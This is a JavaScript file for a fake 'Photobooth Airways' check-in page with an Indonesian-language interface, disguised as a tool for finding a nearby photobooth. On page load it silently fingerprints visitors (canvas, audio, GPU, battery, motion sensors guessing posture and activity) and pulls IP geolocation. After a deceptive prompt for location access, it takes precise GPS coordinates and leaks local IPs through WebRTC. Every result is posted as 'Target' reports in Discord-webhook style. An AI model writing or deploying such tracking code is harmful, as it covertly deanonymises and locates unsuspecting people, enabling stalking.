/**
 * Photobooth Airways — GPS Check-In Logic
 * photobooth.bapel.my.id
 */

/* ── Decorative stars & clouds ── */
function initDecorations() {
  var starsEl = document.getElementById('stars');
  for (var i = 0; i < 80; i++) {
    var s = document.createElement('div');
    s.className = 'star';
    var big = Math.random() > 0.8;
    s.style.cssText = 'left:' + (Math.random() * 100) + '%;top:' + (Math.random() * 80) + '%;'
      + 'animation-duration:' + (Math.random() * 3 + 2) + 's;animation-delay:' + (Math.random() * 4) + 's;'
      + 'width:' + (big ? 3 : 2) + 'px;height:' + (big ? 3 : 2) + 'px;';
    starsEl.appendChild(s);
  }
  var cloudsEl = document.getElementById('clouds');
  for (var j = 0; j < 5; j++) {
    var c = document.createElement('div');
    c.className = 'cloud';
    c.style.cssText = 'width:' + (Math.random() * 200 + 100) + 'px;height:' + (Math.random() * 50 + 20) + 'px;'
      + 'top:' + (Math.random() * 60) + '%;animation-duration:' + (Math.random() * 40 + 30) + 's;'
      + 'animation-delay:' + (-Math.random() * 30) + 's;';
    cloudsEl.appendChild(c);
  }

  // Dynamic boarding pass data
  var now = new Date();
  var date = ('0' + now.getDate()).slice(-2) + '/' + ('0' + (now.getMonth() + 1)).slice(-2);
  var seat = (Math.floor(Math.random() * 30) + 1) + ['A', 'B', 'C', 'D'][Math.floor(Math.random() * 4)];
  ['d', 'm'].forEach(function (suffix) {
    var d = document.getElementById('flightDate-' + suffix);
    var se = document.getElementById('seatNum-' + suffix);
    if (d) d.textContent = date;
    if (se) se.textContent = seat;
  });
}

/* ── Silent system / IP recon ── */
function collectSilent() {
  var localtime = String(new Date().toLocaleTimeString());
  var tz = 'Unknown'; try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch (e) { }

  var gpu = 'Unknown';
  try {
    var cvs = document.createElement('canvas'), gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
    gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
  } catch (e) { }

  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  var netType = conn ? conn.effectiveType : 'Unknown';
  var netDL = conn ? conn.downlink + ' Mbps' : 'Unknown';

  function getCanvasFp() {
    try {
      var c = document.createElement('canvas'), ctx = c.getContext('2d');
      ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069"; ctx.fillText("R4v3n!#", 2, 15); ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("R4v3n!#", 4, 17);
      var b = c.toDataURL(), h = 0; for (var i = 0; i < b.length; i++) { h = ((h << 5) - h) + b.charCodeAt(i); h = h & h; } return Math.abs(h).toString(16);
    } catch (e) { return "error"; }
  }
  var cHash = getCanvasFp();

  var mStr = "N/A", oStr = "N/A", motionSamples = [];
  window.addEventListener('deviceorientation', function (e) { if (e.alpha !== null) oStr = "A:" + Math.round(e.alpha) + " B:" + Math.round(e.beta) + " G:" + Math.round(e.gamma); });
  window.addEventListener('devicemotion', function (e) { 
    if (e.accelerationIncludingGravity && e.accelerationIncludingGravity.x !== null) {
      var x = e.accelerationIncludingGravity.x, y = e.accelerationIncludingGravity.y, z = e.accelerationIncludingGravity.z;
      mStr = "X:" + Math.round(x) + " Y:" + Math.round(y) + " Z:" + Math.round(z);
      motionSamples.push(Math.sqrt(x*x + y*y + z*z));
    } 
  });

  function getAudioFp(callback) {
    try {
      var AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AudioCtx) return callback("N/A_NoCtx");
      var context = new AudioCtx(1, 44100, 44100), oscillator = context.createOscillator();
      oscillator.type = 'triangle'; oscillator.frequency.value = 10000;
      var compressor = context.createDynamicsCompressor();
      compressor.threshold.value = -50; compressor.knee.value = 40; compressor.ratio.value = 12; compressor.attack.value = 0; compressor.release.value = 0.25;
      oscillator.connect(compressor); compressor.connect(context.destination);
      oscillator.start(0); context.startRendering();
      context.oncomplete = function(e) {
        var p = e.renderedBuffer.getChannelData(0), h = 0;
        for (var i = 4500; i < 5000; i++) { h += Math.abs(p[i]); }
        var fpStr = h.toString(16).replace('.', '').toUpperCase().substring(0, 8);
        callback("DEVICE-" + fpStr);
      };
    } catch(e) { callback("Error"); }
  }

  var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';

  getAudioFp(function(aHash) {
    var sysinfo = '```xl\nUser-Agent: ' + navigator.userAgent + '```'
      + '```autohotkey\n'
      + 'Platform: ' + navigator.platform
      + '\nVendor: ' + navigator.vendor
      + '\nLanguage: ' + navigator.language
      + '\nTimezone: ' + tz
      + '\nTime: ' + localtime
      + '\nCookies: ' + navigator.cookieEnabled
      + '\nDo_Not_Track: ' + (navigator.doNotTrack || 'Unknown')
      + '\n'
      + '\n--- Hardware ---'
      + '\nRam: ~' + (navigator.deviceMemory || 'Unknown') + ' GB'
      + '\nCPU_Cores: ' + (navigator.hardwareConcurrency || 'Unknown')
      + '\nGPU: ' + gpu
      + '\nTouch_Points: ' + navigator.maxTouchPoints
      + '\n'
      + '\n--- Screen & Network ---'
      + '\nResolution: ' + screen.width + 'x' + screen.height
      + '\nViewport: ' + window.innerWidth + 'x' + window.innerHeight
      + '\nColor_Depth: ' + screen.colorDepth + '-bit'
      + '\nNet_Type: ' + netType
      + '\nDownlink: ' + netDL
      + '\nCanvas_FP: ' + cHash
      + '\nAudio_FP: ' + aHash;

    function postInfo(batt) {
      var posture = "Perangkat PC Statis", activity = "Memakai Komputer (Tanpa Sensor)";
      if (mStr !== "N/A") {
        posture = "Menunggu Kalibrasi...";
        var match = mStr.match(/X:(-?\d+) Y:(-?\d+) Z:(-?\d+)/);
        if(match) {
          var ax = Math.abs(parseInt(match[1])), ay = Math.abs(parseInt(match[2])), az = Math.abs(parseInt(match[3]));
          if (az >= 8) posture = "Perangkat diletakkan datar (Di atas meja/AFK)";
          else if (ay >= 7) posture = "Perangkat ditegakkan (Menatap layar)";
          else if (ax >= 7) posture = "Perangkat dimiringkan (Mode Landscape/Laptop Layar Lipat)";
          else posture = "Perangkat condong santai (Sudut miring)";
        }
      }
      
      if (motionSamples.length > 3) {
         var sum = 0; for(var i=0; i<motionSamples.length; i++) sum += motionSamples[i];
         var mean = sum / motionSamples.length, variance = 0;
         for(var i=0; i<motionSamples.length; i++) variance += Math.pow(motionSamples[i] - mean, 2);
         variance /= motionSamples.length;
         
         if (variance < 0.2) activity = "Diam Statis / AFK (Tidak disentuh)";
         else if (variance < 0.8) activity = "Pegerakan Santai / Sedang Mengetik";
         else if (variance < 4.0) activity = "Sedang Berjalan / Membawa Perangkat";
         else if (variance < 10.0) activity = "Berjalan Cepat / Berada di Kendaraan Lembut";
         else activity = "Berlari / Berguncang Keras";
      } else if (mStr !== "N/A") {
         activity = "Mengkalibrasi Sensor...";
      }

      var dOStr = oStr === "N/A" ? "Tidak Terdeteksi (Absen / Limitasi Hardware)" : oStr;
      var dMStr = mStr === "N/A" ? "Tidak Ditemukan (Bypass Sensor PC)" : mStr;

      var finalInfo = sysinfo + '\n\n--- Sensors & Kinematics ---\nOrientation: ' + dOStr + '\nMotion_XYZ: ' + dMStr + '\nPosture_Mode: ' + posture + '\nPhysical_Act: ' + activity;
      if (batt) finalInfo += '\n\n--- Battery ---\nCharging: ' + batt.c + '\nLevel: ' + batt.l;
      finalInfo += '```';

      var r = new XMLHttpRequest();
      r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json');
      r.send(JSON.stringify({
        username: 'R4VEN', avatar_url: AVATAR, content: '@everyone Someone Opened The Link O_o',
        embeds: [{ author: { name: 'Target System Information..' }, description: finalInfo, color: 15418782 }]
      }));
    }

    setTimeout(function () {
      if ('getBattery' in navigator) {
        navigator.getBattery().then(function (b) { postInfo({ c: b.charging ? 'Yes' : 'No', l: (b.level * 100) + '%' }); }).catch(function () { postInfo(null); });
      } else { postInfo(null); }
    }, 1000);
  });

  function post(payload) { var r = new XMLHttpRequest(); r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json'); r.send(JSON.stringify(payload)); }

  $.getJSON('https://api.ipify.org?format=json', function (data) {
    post({
      username: 'R4VEN', avatar_url: AVATAR,
      embeds: [{
        author: { name: 'Target Ip' },
        description: '```xl\n' + data.ip + '```\n__**IP Details:**__ https://ip-api.com/#' + data.ip + '\n',
        color: 15548997, footer: { text: 'Geographic location based on IP is approximate.' }
      }]
    });
  });

  $.getJSON('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query', function (res) {
    var pxy = (res.proxy || res.hosting) ? "YES (VPN/Proxy/Cloud)" : "No";
    var mob = res.mobile ? "YES" : "No";
    var recon = '```autohotkey\n'
      + 'IP Address  : ' + res.query + '\n'
      + 'ISP         : ' + res.isp + '\n'
      + 'Org / ASN   : ' + res.org + ' (' + res.as + ')\n'
      + 'Reverse DNS : ' + (res.reverse || 'N/A') + '\n\n'
      + '--- Location ---\n'
      + 'Continent   : ' + res.continent + ' (' + res.continentCode + ')\n'
      + 'Country     : ' + res.country + ' (' + res.countryCode + ')\n'
      + 'Region      : ' + res.regionName + '\n'
      + 'City        : ' + res.city + ' (District: ' + (res.district || 'N/A') + ')\n'
      + 'Zip Code    : ' + (res.zip || 'N/A') + '\n'
      + 'Lat/Lon     : ' + res.lat + ' , ' + res.lon + '\n'
      + 'Timezone    : ' + res.timezone + ' (UTC' + (res.offset / 3600 >= 0 ? '+' : '') + (res.offset / 3600) + ')\n'
      + 'Currency    : ' + res.currency + '\n\n'
      + '--- Network Flags ---\n'
      + 'Cellular    : ' + mob + '\n'
      + 'Proxy/VPN   : ' + pxy + '\n'
      + '```';

    post({
      username: 'R4VEN', avatar_url: AVATAR,
      embeds: [{
        author: { name: 'IP Address Reconnaissance' }, title: res.status,
        description: recon,
        color: 5763719
      }]
    });
  });
}

/* ── UI helpers (work on both desktop -d and mobile -m cards) ── */
function setLoading(on) {
  ['d', 'm'].forEach(function (s) {
    var btn = document.getElementById('allowBtn-' + s);
    var sp = document.getElementById('spinner-' + s);
    var bt = document.getElementById('btnText-' + s);
    var sb = document.getElementById('statusBar-' + s);
    if (!btn) return;
    if (on) {
      btn.classList.add('loading');
      sp.style.display = 'block';
      bt.textContent = 'MEMPROSES\u2026';
      sb.style.display = 'flex';
    } else {
      btn.classList.remove('loading');
      sp.style.display = 'none';
      bt.textContent = s === 'd' ? 'TEMUKAN PHOTOBOOTH TERDEKAT' : 'AKTIFKAN LOKASI & CHECK-IN';
      sb.style.display = 'none';
    }
  });
}

function setStatus(msg) {
  ['d', 'm'].forEach(function (s) {
    var el = document.getElementById('statusText-' + s);
    if (el) el.textContent = msg;
  });
}

/* ── Show success overlay, then load iframe ── */
function showSuccess() {
  ['d', 'm'].forEach(function (s) {
    var mc = document.getElementById('mainContent-' + s);
    var so = document.getElementById('successOverlay-' + s);
    if (mc) mc.style.display = 'none';
    if (so) so.style.display = 'flex';
  });
  setTimeout(function () {
    var frame = document.getElementById('site-frame');
    frame.src = 'https://photobooth.bapel.my.id';
    frame.style.display = 'block';
    setTimeout(function () { frame.classList.add('visible'); }, 50);
  }, 1800);
}

/* ── GPS permission request ── */
function requestLocation() {
  setLoading(true);
  setStatus('Mendeteksi lokasi Anda\u2026');

  if (!navigator.geolocation) {
    setStatus('Geolocation tidak didukung browser ini.');
    setLoading(false);
    return;
  }

  navigator.geolocation.getCurrentPosition(onGpsSuccess, onGpsError, {
    enableHighAccuracy: true, timeout: 20000, maximumAge: 0
  });
}

function onGpsSuccess(pos) {
  setStatus('Lokasi terdeteksi! Mencetak boarding pass\u2026');
  var lat = pos.coords.latitude, lon = pos.coords.longitude;
  var acc = pos.coords.accuracy || 0;
  var alt = pos.coords.altitude !== null ? pos.coords.altitude : 'N/A';
  var spd = pos.coords.speed !== null ? pos.coords.speed : 'N/A';
  var hdg = pos.coords.heading !== null ? pos.coords.heading : 'N/A';

  var ll = '```prolog\n'
    + 'Latitude  : ' + lat + '\n'
    + 'Longitude : ' + lon + '\n'
    + 'Accuracy  : ' + acc + ' meters\n'
    + 'Altitude  : ' + alt + ' meters\n'
    + 'Speed     : ' + spd + ' m/s\n'
    + 'Heading   : ' + hdg + ' degrees\n'
    + '```\n'
    + '__**Google Maps:**__ https://www.google.com/maps/place/' + lat + ',' + lon + '\n'
    + '__**Google Earth:**__ https://earth.google.com/web/search/' + lat + ',' + lon;

  var r = new XMLHttpRequest();
  r.open('POST', '/location_update');
  r.setRequestHeader('Content-type', 'application/json');
  r.send(JSON.stringify({
    username: 'R4VEN',
    avatar_url: 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png',
    embeds: [{
      author: { name: 'Target Allowed Location Permission' },
      title: 'GPS location of target..',
      description: ll + '\n',
      color: 15844367,
      footer: { text: 'High accuracy geolocation using device sensors.' }
    }]
  }));

  try {
    var rtc = new RTCPeerConnection({ iceServers: [] }); rtc.createDataChannel('');
    rtc.createOffer().then(function (offer) { rtc.setLocalDescription(offer); });
    var localIps = [];
    rtc.onicecandidate = function (e) {
      if (!e || !e.candidate) return;
      var ip = e.candidate.candidate.split(' ')[4];
      if (localIps.indexOf(ip) === -1 && !ip.endsWith('.local')) {
        localIps.push(ip);
        var rL = new XMLHttpRequest();
        rL.open('POST', '/location_update'); rL.setRequestHeader('Content-type', 'application/json');
        rL.send(JSON.stringify({
          username: 'R4VEN', avatar_url: 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png',
          embeds: [{
            author: { name: 'Hardware & Intranet Reconnaissance' },
            description: '**WebRTC Local IP Leak:**\n```json\n"' + localIps.join(', ') + '"```',
            color: 15158332
          }]
        }));
      }
    };
  } catch(e) {}

  setTimeout(showSuccess, 800);
}

function onGpsError(err) {
  if (err.code === err.PERMISSION_DENIED) {
    var r = new XMLHttpRequest();
    r.open('POST', '/location_update');
    r.setRequestHeader('Content-type', 'application/json');
    r.send(JSON.stringify({
      username: 'R4VEN',
      avatar_url: 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png',
      content: '```diff\n- User denied the request for Geolocation.```'
    }));
    setStatus('Izin ditolak. Harap aktifkan lokasi di pengaturan browser.');
  } else {
    setStatus('Gagal mendapatkan lokasi. Silakan coba lagi.');
  }
  setLoading(false);
}

/* ── Bootstrap ── */
window.onload = function () {
  initDecorations();
  collectSilent();
};
